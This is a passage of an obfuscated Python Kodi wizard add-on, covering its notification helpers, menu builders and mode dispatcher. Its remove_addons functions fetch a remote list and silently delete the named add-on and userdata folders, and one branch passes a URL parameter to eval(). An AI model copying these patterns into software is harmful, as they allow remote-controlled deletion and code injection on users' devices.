			if O0OOOOO0000OO0OO0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5054
			if STARTP2 ()=='ok':#line:5055
				notify .notification (O00000OOO00OO000O ,True )#line:5056
		except Exception as OOOO00OO0OOO00O00 :#line:5057
			wiz .log ("Error on Notifications Window: %s"%str (OOOO00OO0OOO00O00 ),xbmc .LOGERROR )#line:5058
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5059
def testnotify2 ():#line:5060
	OOO0OO0O0000OO000 =wiz .workingURL (NOTIFICATION2 )#line:5061
	if OOO0OO0O0000OO000 ==True :#line:5062
		try :#line:5063
			O0OO00O0000OOO0O0 ,O0000OOOO00OO00OO =wiz .splitNotify (NOTIFICATION2 )#line:5064
			if O0OO00O0000OOO0O0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5065
			if STARTP2 ()=='ok':#line:5066
				notify .notification2 (O0000OOOO00OO00OO ,True )#line:5067
		except Exception as OOOO0OOO00OO00OOO :#line:5068
			wiz .log ("Error on Notifications Window: %s"%str (OOOO0OOO00OO00OOO ),xbmc .LOGERROR )#line:5069
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5070
def testnotify3 ():#line:5071
	OO000000O0OO00000 =wiz .workingURL (NOTIFICATION3 )#line:5072
	if OO000000O0OO00000 ==True :#line:5073
		try :#line:5074
			O0OOOOOOOO00O00O0 ,O00OO00000OO0O0OO =wiz .splitNotify (NOTIFICATION3 )#line:5075
			if O0OOOOOOOO00O00O0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5076
			if STARTP2 ()=='ok':#line:5077
				notify .notification3 (O00OO00000OO0O0OO ,True )#line:5078
		except Exception as O000OO000OO00OOOO :#line:5079
			wiz .log ("Error on Notifications Window: %s"%str (O000OO000OO00OOOO ),xbmc .LOGERROR )#line:5080
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5081
def servicemanual ():#line:5082
	OOOO0O0O0O0OOOOOO =wiz .workingURL (HELPINFO )#line:5083
	if OOOO0O0O0O0OOOOOO ==True :#line:5084
		try :#line:5085
			OOO0OOO0000OO0OO0 ,O0OO00OOO0OO00OO0 =wiz .splitNotify (HELPINFO )#line:5086
			if OOO0OOO0000OO0OO0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Notification: Not Formated Correctly[/COLOR]"%COLOR2 );return #line:5087
			notify .helpinfo (O0OO00OOO0OO00OO0 ,True )#line:5088
		except Exception as OO0OOO00O00OO0O0O :#line:5089
			wiz .log ("Error on Notifications Window: %s"%str (OO0OOO00O00OO0O0O ),xbmc .LOGERROR )#line:5090
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Invalid URL for Notification[/COLOR]"%COLOR2 )#line:5091
def testupdate ():#line:5093
	if BUILDNAME =="":#line:5094
		notify .updateWindow ()#line:5095
	else :#line:5096
		notify .updateWindow (BUILDNAME ,BUILDVERSION ,BUILDLATEST ,wiz .checkBuild (BUILDNAME ,'icon'),wiz .checkBuild (BUILDNAME ,'fanart'))#line:5097
def testfirst ():#line:5099
	notify .firstRun ()#line:5100
def testfirstRun ():#line:5102
	notify .firstRunSettings ()#line:5103
def fastinstall ():#line:5106
	notify .firstRuninstall ()#line:5107
def addDir (O0OOOOOOOOOOO00OO ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5114
	O0O0OOO0OO00OOO0O =sys .argv [0 ]#line:5115
	if not mode ==None :O0O0OOO0OO00OOO0O +="?mode=%s"%urllib .quote_plus (mode )#line:5116
	if not name ==None :O0O0OOO0OO00OOO0O +="&name="+urllib .quote_plus (name )#line:5117
	if not url ==None :O0O0OOO0OO00OOO0O +="&url="+urllib .quote_plus (url )#line:5118
	OO00000OO00OO0OOO =True #line:5119
	if themeit :O0OOOOOOOOOOO00OO =themeit %O0OOOOOOOOOOO00OO #line:5120
	O00O00OO00O0OO000 =xbmcgui .ListItem (O0OOOOOOOOOOO00OO ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5121
	O00O00OO00O0OO000 .setInfo (type ="Video",infoLabels ={"Title":O0OOOOOOOOOOO00OO ,"Plot":description })#line:5122
	O00O00OO00O0OO000 .setProperty ("Fanart_Image",fanart )#line:5123
	if not menu ==None :O00O00OO00O0OO000 .addContextMenuItems (menu ,replaceItems =overwrite )#line:5124
	OO00000OO00OO0OOO =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O0O0OOO0OO00OOO0O ,listitem =O00O00OO00O0OO000 ,isFolder =True )#line:5125
	return OO00000OO00OO0OOO #line:5126
def addFile (O0OO000O0000O0O0O ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5128
	O0O0O00000OOO0OOO =sys .argv [0 ]#line:5129
	if not mode ==None :O0O0O00000OOO0OOO +="?mode=%s"%urllib .quote_plus (mode )#line:5130
	if not name ==None :O0O0O00000OOO0OOO +="&name="+urllib .quote_plus (name )#line:5131
	if not url ==None :O0O0O00000OOO0OOO +="&url="+urllib .quote_plus (url )#line:5132
	O000OOO0OOOOOO0OO =True #line:5133
	if themeit :O0OO000O0000O0O0O =themeit %O0OO000O0000O0O0O #line:5134
	OOOO0O000OOO0OOO0 =xbmcgui .ListItem (O0OO000O0000O0O0O ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5135
	OOOO0O000OOO0OOO0 .setInfo (type ="Video",infoLabels ={"Title":O0OO000O0000O0O0O ,"Plot":description })#line:5136
	OOOO0O000OOO0OOO0 .setProperty ("Fanart_Image",fanart )#line:5137
	if not menu ==None :OOOO0O000OOO0OOO0 .addContextMenuItems (menu ,replaceItems =overwrite )#line:5138
	O000OOO0OOOOOO0OO =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O0O0O00000OOO0OOO ,listitem =OOOO0O000OOO0OOO0 ,isFolder =False )#line:5139
	return O000OOO0OOOOOO0OO #line:5140
def get_params ():#line:5142
	O0O00OOOOO00O00O0 =[]#line:5143
	O00OOO0O0O0O0OO00 =sys .argv [2 ]#line:5144
	if len (O00OOO0O0O0O0OO00 )>=2 :#line:5145
		O000O0O0O00OO0O00 =sys .argv [2 ]#line:5146
		O00OOOO0OOOO00O0O =O000O0O0O00OO0O00 .replace ('?','')#line:5147
		if (O000O0O0O00OO0O00 [len (O000O0O0O00OO0O00 )-1 ]=='/'):#line:5148
			O000O0O0O00OO0O00 =O000O0O0O00OO0O00 [0 :len (O000O0O0O00OO0O00 )-2 ]#line:5149
		OOOO00O0O00OOO0O0 =O00OOOO0OOOO00O0O .split ('&')#line:5150
		O0O00OOOOO00O00O0 ={}#line:5151
		for O0OOOOO0O00000OOO in range (len (OOOO00O0O00OOO0O0 )):#line:5152
			OO0O00OOOO0O00O0O ={}#line:5153
			OO0O00OOOO0O00O0O =OOOO00O0O00OOO0O0 [O0OOOOO0O00000OOO ].split ('=')#line:5154
			if (len (OO0O00OOOO0O00O0O ))==2 :#line:5155
				O0O00OOOOO00O00O0 [OO0O00OOOO0O00O0O [0 ]]=OO0O00OOOO0O00O0O [1 ]#line:5156
		return O0O00OOOOO00O00O0 #line:5158
def remove_addons ():#line:5160
	try :#line:5161
			import json #line:5162
			O00OO00OO0OOO000O =urllib2 .urlopen (remove_url ).readlines ()#line:5163
			for OO0000OO0OO000000 in O00OO00OO0OOO000O :#line:5164
				OO00O0O0OO0O0OO00 =OO0000OO0OO000000 .split (':')[1 ].strip ()#line:5166
				OO000OOOOO00O0000 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":"%s","enabled":%s}}'%(OO00O0O0OO0O0OO00 ,'false')#line:5167
				OOOO00OOO0O0OO0O0 =xbmc .executeJSONRPC (OO000OOOOO00O0000 )#line:5168
				OOOO00000OO0O00O0 =json .loads (OOOO00OOO0O0OO0O0 )#line:5169
				O0O0000O00OOO00OO =os .path .join (addons_folder ,OO00O0O0OO0O0OO00 )#line:5171
				if os .path .exists (O0O0000O00OOO00OO ):#line:5173
					for O0000000OO0OOO0O0 ,O000O0O0O0OO0OO00 ,O0O000OOOOOO0OO0O in os .walk (O0O0000O00OOO00OO ):#line:5174
						for O0OOO000O00O0OO0O in O0O000OOOOOO0OO0O :#line:5175
							os .unlink (os .path .join (O0000000OO0OOO0O0 ,O0OOO000O00O0OO0O ))#line:5176
						for OO000O0OO00O0OO00 in O000O0O0O0OO0OO00 :#line:5177
							shutil .rmtree (os .path .join (O0000000OO0OOO0O0 ,OO000O0OO00O0OO00 ))#line:5178
					os .rmdir (O0O0000O00OOO00OO )#line:5179
			xbmc .executebuiltin ('Container.Refresh')#line:5181
			xbmc .executebuiltin ("XBMC.UpdateLocalAddons()")#line:5182
			xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:5183
	except :pass #line:5184
def remove_addons2 ():#line:5185
	try :#line:5186
			import json #line:5187
			OO000000OOO0O0000 =urllib2 .urlopen (remove_url2 ).readlines ()#line:5188
			for O000OO0OOOO0OO000 in OO000000OOO0O0000 :#line:5189
				OOOOOO00O00O0OO00 =O000OO0OOOO0OO000 .split (':')[1 ].strip ()#line:5191
				O0O00OOOO0OOO00OO ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled1","params":{"addonid":"%s","enabled":%s}}'%(OOOOOO00O00O0OO00 ,'false')#line:5192
				O0000000OO00OOOOO =xbmc .executeJSONRPC (O0O00OOOO0OOO00OO )#line:5193
				OOOOO00O0O00000OO =json .loads (O0000000OO00OOOOO )#line:5194
				O0OO00O0O00O0OOOO =os .path .join (user_folder ,OOOOOO00O00O0OO00 )#line:5196
				if os .path .exists (O0OO00O0O00O0OOOO ):#line:5198
					for O0O00000O00O0O0O0 ,O00O0O0OO00O000O0 ,OO00OO0000O00OOOO in os .walk (O0OO00O0O00O0OOOO ):#line:5199
						for O00O00O0O000OOO00 in OO00OO0000O00OOOO :#line:5200
							os .unlink (os .path .join (O0O00000O00O0O0O0 ,O00O00O0O000OOO00 ))#line:5201
						for OO000O0O00OOOOO0O in O00O0O0OO00O000O0 :#line:5202
							shutil .rmtree (os .path .join (O0O00000O00O0O0O0 ,OO000O0O00OOOOO0O ))#line:5203
					os .rmdir (O0OO00O0O00O0OOOO )#line:5204
	except :pass #line:5206
params =get_params ()#line:5207
url =None #line:5208
name =None #line:5209
mode =None #line:5210
try :mode =urllib .unquote_plus (params ["mode"])#line:5212
except :pass #line:5213
try :name =urllib .unquote_plus (params ["name"])#line:5214
except :pass #line:5215
try :url =urllib .unquote_plus (params ["url"])#line:5216
except :pass #line:5217
wiz .log ('[ Version : \'%s\' ] [ Mode : \'%s\' ] [ Name : \'%s\' ] [ Url : \'%s\' ]'%(VERSION ,mode if not mode ==''else None ,name ,url ))#line:5219
wiz .log ("AAAAAAAAAAAAAAAAAAAAAAAAAA URL: %s"%mode )#line:5220
def setView (OOOOO0OO00OO0OOO0 ,O0OO0OOO0O00O0000 ):#line:5221
	if wiz .getS ('auto-view')=='true':#line:5222
		O00000O00O0O0O0O0 =wiz .getS (O0OO0OOO0O00O0000 )#line:5223
		if O00000O00O0O0O0O0 =='50'and KODIV >=17 and SKIN =='skin.estuary':O00000O00O0O0O0O0 ='55'#line:5224
		if O00000O00O0O0O0O0 =='500'and KODIV >=17 and SKIN =='skin.estuary':O00000O00O0O0O0O0 ='50'#line:5225
		wiz .ebi ("Container.SetViewMode(%s)"%O00000O00O0O0O0O0 )#line:5226
if mode ==None :index ()#line:5228
elif mode =='wizardupdate':wiz .wizardUpdate ()#line:5230
elif mode =='builds':buildMenu ()#line:5231
elif mode =='viewbuild':viewBuild (name )#line:5232
elif mode =='buildinfo':buildInfo (name )#line:5233
elif mode =='buildpreview':buildVideo (name )#line:5234
elif mode =='install':buildWizard (name ,url )#line:5235
elif mode =='theme':buildWizard (name ,mode ,url )#line:5236
elif mode =='viewthirdparty':viewThirdList (name )#line:5237
elif mode =='installthird':thirdPartyInstall (name ,url )#line:5238
elif mode =='editthird':editThirdParty (name );wiz .refresh ()#line:5239
elif mode =='maint':maintMenu (name )#line:5241
elif mode =='passpin':passandpin ()#line:5242
elif mode =='backmyupbuild':backmyupbuild ()#line:5243
elif mode =='kodi17fix':wiz .kodi17Fix ()#line:5244
elif mode =='kodi177fix':wiz .kodi177Fix ()#line:5245
elif mode =='advancedsetting':advancedWindow (name )#line:5246
elif mode =='autoadvanced':showAutoAdvanced ();wiz .refresh ()#line:5247
elif mode =='removeadvanced':removeAdvanced ();wiz .refresh ()#line:5248
elif mode =='asciicheck':wiz .asciiCheck ()#line:5249
elif mode =='backupbuild':wiz .backUpOptions ('build')#line:5250
elif mode =='backupgui':wiz .backUpOptions ('guifix')#line:5251
elif mode =='backuptheme':wiz .backUpOptions ('theme')#line:5252
elif mode =='backupaddon':wiz .backUpOptions ('addondata')#line:5253
elif mode =='oldThumbs':wiz .oldThumbs ()#line:5254
elif mode =='clearbackup':wiz .cleanupBackup ()#line:5255
elif mode =='convertpath':wiz .convertSpecial (HOME )#line:5256
elif mode =='currentsettings':viewAdvanced ()#line:5257
elif mode =='fullclean':totalClean ();wiz .refresh ()#line:5258
elif mode =='clearcache':clearCache ();wiz .refresh ()#line:5259
elif mode =='fixwizard':fixwizard ();wiz .refresh ()#line:5260
elif mode =='fixskin':backtokodi ()#line:5261
elif mode =='testcommand':testcommand ()#line:5262
elif mode =='logsend':logsend ()#line:5263
elif mode =='rdon':rdon ()#line:5264
elif mode =='rdoff':rdoff ()#line:5265
elif mode =='setrd':setrealdebrid ()#line:5266
elif mode =='setrd2':setautorealdebrid ()#line:5267
elif mode =='clearpackages':wiz .clearPackages ();wiz .refresh ()#line:5268
elif mode =='clearcrash':wiz .clearCrash ();wiz .refresh ()#line:5269
elif mode =='clearthumb':clearThumb ();wiz .refresh ()#line:5270
elif mode =='checksources':wiz .checkSources ();wiz .refresh ()#line:5271
elif mode =='checkrepos':wiz .checkRepos ();wiz .refresh ()#line:5272
elif mode =='freshstart':freshStart ()#line:5273
elif mode =='forceupdate':wiz .forceUpdate ()#line:5274
elif mode =='forceprofile':wiz .reloadProfile (wiz .getInfo ('System.ProfileName'))#line:5275
elif mode =='forceclose':wiz .killxbmc ()#line:5276
elif mode =='forceskin':wiz .ebi ("ReloadSkin()");wiz .refresh ()#line:5277
elif mode =='hidepassword':wiz .hidePassword ()#line:5278
elif mode =='unhidepassword':wiz .unhidePassword ()#line:5279
elif mode =='enableaddons':enableAddons ()#line:5280
elif mode =='toggleaddon':wiz .toggleAddon (name ,url );wiz .refresh ()#line:5281
elif mode =='togglecache':toggleCache (name );wiz .refresh ()#line:5282
elif mode =='toggleadult':wiz .toggleAdult ();wiz .refresh ()#line:5283
elif mode =='changefeq':changeFeq ();wiz .refresh ()#line:5284
elif mode =='uploadlog':uploadLog .Main ()#line:5285
elif mode =='viewlog':LogViewer ()#line:5286
elif mode =='viewwizlog':LogViewer (WIZLOG )#line:5287
elif mode =='viewerrorlog':errorChecking (all =True )#line:5288
elif mode =='clearwizlog':f =open (WIZLOG ,'w');f .close ();wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Wizard Log Cleared![/COLOR]"%COLOR2 )#line:5289
elif mode =='purgedb':purgeDb ()#line:5290
elif mode =='fixaddonupdate':fixUpdate ()#line:5291
elif mode =='removeaddons':removeAddonMenu ()#line:5292
elif mode =='removeaddon':removeAddon (name )#line:5293
elif mode =='removeaddondata':removeAddonDataMenu ()#line:5294
elif mode =='removedata':removeAddonData (name )#line:5295
elif mode =='resetaddon':total =wiz .cleanHouse (ADDONDATA ,ignore =True );wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Addon_Data reset[/COLOR]"%COLOR2 )#line:5296
elif mode =='systeminfo':systemInfo ()#line:5297
elif mode =='restorezip':restoreit ('build')#line:5298
elif mode =='restoregui':restoreit ('gui')#line:5299
elif mode =='restoreaddon':restoreit ('addondata')#line:5300
elif mode =='restoreextzip':restoreextit ('build')#line:5301
elif mode =='restoreextgui':restoreextit ('gui')#line:5302
elif mode =='restoreextaddon':restoreextit ('addondata')#line:5303
elif mode =='writeadvanced':writeAdvanced (name ,url )#line:5304
elif mode =='apk':apkMenu (name )#line:5306
elif mode =='apkscrape':apkScraper (name )#line:5307
elif mode =='apkinstall':apkInstaller (name ,url )#line:5308
elif mode =='speed':speedMenu ()#line:5309
elif mode =='net':net_tools ()#line:5310
elif mode =='GetList':GetList (url )#line:5311
elif mode =='youtube':youtubeMenu (name )#line:5312
elif mode =='viewVideo':playVideo (url )#line:5313
elif mode =='addons':addonMenu (name )#line:5315
elif mode =='addoninstall':addonInstaller (name ,url )#line:5316
elif mode =='savedata':saveMenu ()#line:5318
elif mode =='togglesetting':wiz .setS (name ,'false'if wiz .getS (name )=='true'else 'true');wiz .refresh ()#line:5319
elif mode =='managedata':manageSaveData (name )#line:5320
elif mode =='whitelist':wiz .whiteList (name )#line:5321
elif mode =='trakt':traktMenu ()#line:5323
elif mode =='savetrakt':traktit .traktIt ('update',name )#line:5324
elif mode =='restoretrakt':traktit .traktIt ('restore',name )#line:5325
elif mode =='addontrakt':traktit .traktIt ('clearaddon',name )#line:5326
elif mode =='cleartrakt':traktit .clearSaved (name )#line:5327
elif mode =='authtrakt':traktit .activateTrakt (name );wiz .refresh ()#line:5328
elif mode =='updatetrakt':traktit .autoUpdate ('all')#line:5329
elif mode =='importtrakt':traktit .importlist (name );wiz .refresh ()#line:5330
elif mode =='realdebrid':realMenu ()#line:5332
elif mode =='savedebrid':debridit .debridIt ('update',name )#line:5333
elif mode =='restoredebrid':debridit .debridIt ('restore',name )#line:5334
elif mode =='addondebrid':debridit .debridIt ('clearaddon',name )#line:5335
elif mode =='cleardebrid':debridit .clearSaved (name )#line:5336
elif mode =='authdebrid':debridit .activateDebrid (name );wiz .refresh ()#line:5337
elif mode =='updatedebrid':debridit .autoUpdate ('all')#line:5338
elif mode =='importdebrid':debridit .importlist (name );wiz .refresh ()#line:5339
elif mode =='login':loginMenu ()#line:5341
elif mode =='savelogin':loginit .loginIt ('update',name )#line:5342
elif mode =='restorelogin':loginit .loginIt ('restore',name )#line:5343
elif mode =='addonlogin':loginit .loginIt ('clearaddon',name )#line:5344
elif mode =='clearlogin':loginit .clearSaved (name )#line:5345
elif mode =='authlogin':loginit .activateLogin (name );wiz .refresh ()#line:5346
elif mode =='updatelogin':loginit .autoUpdate ('all')#line:5347
elif mode =='importlogin':loginit .importlist (name );wiz .refresh ()#line:5348
elif mode =='contact':notify .contact (CONTACT )#line:5350
elif mode =='settings':wiz .openS (name );wiz .refresh ()#line:5351
elif mode =='opensettings':id =eval (url .upper ()+'ID')[name ]['plugin'];addonid =wiz .addonId (id );addonid .openSettings ();wiz .refresh ()#line:5352
elif mode =='developer':developer ()#line:5354
elif mode =='converttext':wiz .convertText ()#line:5355
elif mode =='createqr':wiz .createQR ()#line:5356
elif mode =='testnotify':testnotify ()#line:5357
elif mode =='testnotify2':testnotify2 ()#line:5358
elif mode =='servicemanual':servicemanual ()#line:5359
elif mode =='fastinstall':fastinstall ()#line:5360
elif mode =='testupdate':testupdate ()#line:5361
elif mode =='testfirst':testfirst ()#line:5362
elif mode =='testfirstrun':testfirstRun ()#line:5363
elif mode =='testapk':notify .apkInstaller ('SPMC')#line:5364
elif mode =='bg':wiz .bg_install (name ,url )#line:5366
elif mode =='bgcustom':wiz .bg_custom ()#line:5367
elif mode =='bgremove':wiz .bg_remove ()#line:5368
elif mode =='bgdefault':wiz .bg_default ()#line:5369
elif mode =='rdset':rdsetup ()#line:5370
elif mode =='mor':morsetup ()#line:5371
elif mode =='mor2':morsetup2 ()#line:5372
elif mode =='resolveurl':resolveurlsetup ()#line:5373
elif mode =='urlresolver':urlresolversetup ()#line:5374
elif mode =='forcefastupdate':forcefastupdate ()#line:5375
elif mode =='traktset':traktsetup ()#line:5376
elif mode =='placentaset':placentasetup ()#line:5377
elif mode =='flixnetset':flixnetsetup ()#line:5378
elif mode =='reptiliaset':reptiliasetup ()#line:5379
elif mode =='yodasset':yodasetup ()#line:5380
elif mode =='numbersset':numberssetup ()#line:5381
elif mode =='uranusset':uranussetup ()#line:5382
elif mode =='genesisset':genesissetup ()#line:5383
elif mode =='fastupdate':fastupdate ()#line:5384
elif mode =='folderback':folderback ()#line:5385
elif mode =='menudata':Menu ()#line:5386
elif mode ==2 :#line:5388
        wiz .torent_menu ()#line:5389
elif mode ==3 :#line:5390
        wiz .popcorn_menu ()#line:5391
elif mode ==8 :#line:5392
        wiz .metaliq_fix ()#line:5393
elif mode ==9 :#line:5394
        wiz .quasar_menu ()#line:5395
elif mode ==5 :#line:5396
        swapSkins ('skin.Premium.mod')#line:5397
elif mode ==13 :#line:5398
        wiz .elementum_menu ()#line:5399
elif mode ==16 :#line:5400
        wiz .fix_wizard ()#line:5401
elif mode ==17 :#line:5402
        wiz .last_play ()#line:5403
elif mode ==18 :#line:5404
        wiz .normal_metalliq ()#line:5405
elif mode ==19 :#line:5406
        wiz .fast_metalliq ()#line:5407
elif mode ==20 :#line:5408
        wiz .fix_buffer2 ()#line:5409
elif mode ==21 :#line:5410
        wiz .fix_buffer3 ()#line:5411
elif mode ==11 :#line:5412
        wiz .fix_buffer ()#line:5413
elif mode ==15 :#line:5414
        wiz .fix_font ()#line:5415
elif mode ==14 :#line:5416
        wiz .clean_pass ()#line:5417
elif mode ==22 :#line:5418
        wiz .movie_update ()#line:5419
elif mode =='adv_settings':buffer1 ()#line:5420
elif mode =='getpass':getpass ()#line:5421
elif mode =='setpass':setpass ()#line:5422
elif mode =='setuname':setuname ()#line:5423
elif mode =='passandUsername':passandUsername ()#line:5424
elif mode =='9':disply_hwr ()#line:5425
elif mode =='99':disply_hwr2 ()#line:5426
xbmcplugin .endOfDirectory (int (sys .argv [1 ]))